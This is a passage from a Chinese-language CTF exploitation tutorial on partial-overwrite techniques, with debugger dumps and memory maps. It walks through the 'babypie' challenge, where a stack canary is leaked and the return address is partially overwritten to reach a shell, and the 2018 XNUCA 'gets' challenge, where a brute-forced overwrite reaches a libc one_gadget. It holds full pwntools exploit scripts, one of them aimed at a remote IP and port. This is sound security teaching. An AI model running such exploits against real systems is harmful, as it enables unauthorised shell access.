06:0030│ rbp      0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
07:0038│          0x7ffd97aa0448 —▸ 0x557c8443aa6a ◂— mov    eax, 0
Breakpoint *(0x557c8443a000+0xA08)
pwndbg> canary
$1 = 0
canary : 0xb3012605fc402a00
pwndbg>
```

canary 在 rbp - 0x8 的位置上, 可以看出此时 canary 的低位已经被覆盖为 0x61, 这样只要接收 'a' * (0x30 - 0x8 + 1) 后的 7 位, 再加上最低位的 '\0', 我们就恢复出程序的 canary 了

#### 覆盖返回地址
有了 canary 后, 就可以通过第二次的栈溢出来改写返回地址了, 控制返回地址到 getshell 函数即可, 我们先看一下没溢出时的返回地址

```asm
0x000055dc43694a1e in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RBX  0x0
 RCX  0x7f206c6696f0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x0
 RSI  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f206cb22700 ◂— 0x7f206cb22700
 R9   0x3e
 R10  0x73
 R11  0x246
 R12  0x55dc43694830 ◂— xor    ebp, ebp
 R13  0x7fff9aa3b050 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
 RSP  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RIP  0x55dc43694a1e ◂— call   0x55dc436947f0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
   0x55dc43694a08    call   0x55dc436947e0
 
   0x55dc43694a0d    lea    rax, [rbp - 0x30]
   0x55dc43694a11    mov    edx, 0x60
   0x55dc43694a16    mov    rsi, rax
   0x55dc43694a19    mov    edi, 0
 ► 0x55dc43694a1e    call   0x55dc436947f0
 
   0x55dc43694a23    mov    eax, 0
   0x55dc43694a28    mov    rcx, qword ptr [rbp - 8]
   0x55dc43694a2c    xor    rcx, qword ptr fs:[0x28]
   0x55dc43694a35    je     0x55dc43694a3c
 
   0x55dc43694a37    call   0x55dc436947c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rax rsi rsp  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│              0x7fff9aa3af48 ◂— 0xbfe0cfbabccd2861
06:0030│ rbp          0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
07:0038│              0x7fff9aa3af58 —▸ 0x55dc43694a6a ◂— mov    eax, 0
pwndbg> x/10i (0x0A3E+0x55dc43694000) 
   0x55dc43694a3e:	push   rbp
   0x55dc43694a3f:	mov    rbp,rsp
   0x55dc43694a42:	lea    rdi,[rip+0xd7]        # 0x55dc43694b20
   0x55dc43694a49:	call   0x55dc436947d0
   0x55dc43694a4e:	nop
   0x55dc43694a4f:	pop    rbp
   0x55dc43694a50:	ret    
   0x55dc43694a51:	push   rbp
   0x55dc43694a52:	mov    rbp,rsp
   0x55dc43694a55:	sub    rsp,0x10
```
可以发现, 此时的返回地址与 get shell 函数的地址只有低位的 16 bit 不同, 如果覆写低 16 bit 为 `0x?A3E`, 就有一定的几率 get shell

最终的脚本如下:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

while True:
    try:
        io = process("./babypie", timeout = 1)

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        io.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + io.recvn(7)
        success(canary.encode('hex'))

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')

        io.interactive()
    except Exception as e:
        io.close()
        print e
```
需要注意的是, 这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段

### 2018-XNUCA-gets

这个题目也挺有意思的，如下

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v4; // [rsp+0h] [rbp-18h]

  gets((char *)&v4);
  return 0LL;
}
```

程序就这么小，很明显有一个栈溢出的漏洞，然而没有任何 leak。。

#### 确定保护

先来看看程序的保护

```c
[*] '/mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

比较好的是程序没有 canary，自然我们很容易控制程序的 EIP，但是控制到哪里是一个问题。

#### 分析

我们通过 ELF 的基本执行流程（可执行文件部分）来知道程序的基本执行流程，与此同时我们发现在栈上存在着两个函数的返回地址。

```asm
pwndbg> stack 25
00:0000│ rsp  0x7fffffffe398 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
01:0008│      0x7fffffffe3a0 ◂— 0x1
02:0010│      0x7fffffffe3a8 —▸ 0x7fffffffe478 —▸ 0x7fffffffe6d9 ◂— 0x6667682f746e6d2f ('/mnt/hgf')
03:0018│      0x7fffffffe3b0 ◂— 0x1f7ffcca0
04:0020│      0x7fffffffe3b8 —▸ 0x400420 ◂— sub    rsp, 0x18
05:0028│      0x7fffffffe3c0 ◂— 0x0
06:0030│      0x7fffffffe3c8 ◂— 0xf086047f3fb49558
07:0038│      0x7fffffffe3d0 —▸ 0x400440 ◂— xor    ebp, ebp
08:0040│      0x7fffffffe3d8 —▸ 0x7fffffffe470 ◂— 0x1
09:0048│      0x7fffffffe3e0 ◂— 0x0
... ↓
0b:0058│      0x7fffffffe3f0 ◂— 0xf79fb00f2749558
0c:0060│      0x7fffffffe3f8 ◂— 0xf79ebba9ae49558
0d:0068│      0x7fffffffe400 ◂— 0x0
... ↓
10:0080│      0x7fffffffe418 —▸ 0x7fffffffe488 —▸ 0x7fffffffe704 ◂— 0x504d554a4f545541 ('AUTOJUMP')
11:0088│      0x7fffffffe420 —▸ 0x7ffff7ffe168 ◂— 0x0
12:0090│      0x7fffffffe428 —▸ 0x7ffff7de77cb (_dl_init+139) ◂— jmp    0x7ffff7de77a0
```

其中 `__libc_start_main+240` 位于 libc 中，`_dl_init+139` 位于 ld 中

```
0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0
0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
```

一个比较自然的想法就是我们通过 partial overwrite 来修改这两个地址到某个获取 shell 的位置，那自然就是 Onegadget 了。那么我们究竟覆盖哪一个呢？？

我们先来分析一下 `libc` 的基地址 `0x7ffff7a0d000`。我们一般要覆盖字节的话，至少要覆盖1个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 `gets`读取的，也就意味着字符串的末尾肯定会存在`\x00`。

而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看`__libc_start_main+240` 的地址 `0x7ffff7a2d830`，如果覆盖3个字节，那么就是 `0x7ffff700xxxx`，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。

一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 `__libc_start_main+240` ，显然是不可能的。

而 ld 的基地址呢？如果我们覆盖了栈上`_dl_init+139`，即为`0x7ffff700xxxx`。而观察上述的内存布局，我们可以发现`libc`位于 `ld` 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为`\x00` 的。

举个例子，目前两者之间的偏移为

```
0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000
```

那么如果 ld 被加载到了 `0x7ffff73ca000`，则显然 `libc` 的起始地址就是`0x7ffff7000000`。

因此，我们有足够的理由选择覆盖栈上存储的`_dl_init+139`。那么覆盖成什么呢？还不知道。因为我们还不知道 libc 的库版本是什么，，

我们可以先随便覆盖覆盖，看看程序会不会崩溃，毕竟此时很有可能会执行 libc 库中的代码。

```python
from pwn import *
context.terminal = ['tmux', 'split', '-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elfpath = './gets'
context.binary = elfpath

elf = ELF(elfpath)
bits = elf.bits


def exp(ip, port):
    for i in range(0x1000):
        if args['REMOTE']:
            p = remote(ip, port)
        else:
            p = process(elfpath, timeout=2)
        # gdb.attach(p)
        try:
            payload = 0x18 * 'a' + p64(0x40059B)
            for _ in range(2):
                payload += 'a' * 8 * 5 + p64(0x40059B)
            payload += 'a' * 8 * 5 + p16(i)
            p.sendline(payload)
            data = p.recv()
            print data
            p.interactive()
            p.close()
        except Exception:
            p.close()
            continue


if __name__ == "__main__":
    exp('106.75.4.189', 35273)
```

最后发现报出了如下错误，一方面，我们可以判断出这肯定是 2.23 版本的 libc；另外一方面，我们我们可以通过`(cfree+0x4c)[0x7f57b6f9253c]`来最终定位 libc 的版本。

```
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c]
/lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40]
[0x7ffdec480f20]
======= Memory map: ========
00400000-00401000 r-xp 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00600000-00601000 r--p 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00601000-00602000 rw-p 00001000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00b21000-00b43000 rw-p 00000000 00:00 0                                  [heap]
7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0
7f57b0021000-7f57b4000000 ---p 00000000 00:00 0
7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0
7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0
7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0
7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0
7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0                          [stack]
7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0                          [vvar]
7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

确定好了 libc 的版本后，我们可以选一个 one_gadget，这里我选择第一个，较低地址的。

```shell
➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

使用如下 exp 继续爆破，

```python
from pwn import *
context.terminal = ['tmux', 'split', '-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elfpath = './gets'
context.binary = elfpath

elf = ELF(elfpath)
bits = elf.bits


def exp(ip, port):
    for i in range(0x1000):
        if args['REMOTE']:
            p = remote(ip, port)
        else:
            p = process(elfpath, timeout=2)
        # gdb.attach(p)
        try:
            payload = 0x18 * 'a' + p64(0x40059B)
            for _ in range(2):
                payload += 'a' * 8 * 5 + p64(0x40059B)
            payload += 'a' * 8 * 5 + '\x16\02'
            p.sendline(payload)

            p.sendline('ls')
            data = p.recv()
            print data
            p.interactive()
            p.close()
        except Exception:
            p.close()
            continue


if __name__ == "__main__":
    exp('106.75.4.189', 35273)
```

最后获取到 shell。

```python
$ ls
exp.py  gets
```

### 题目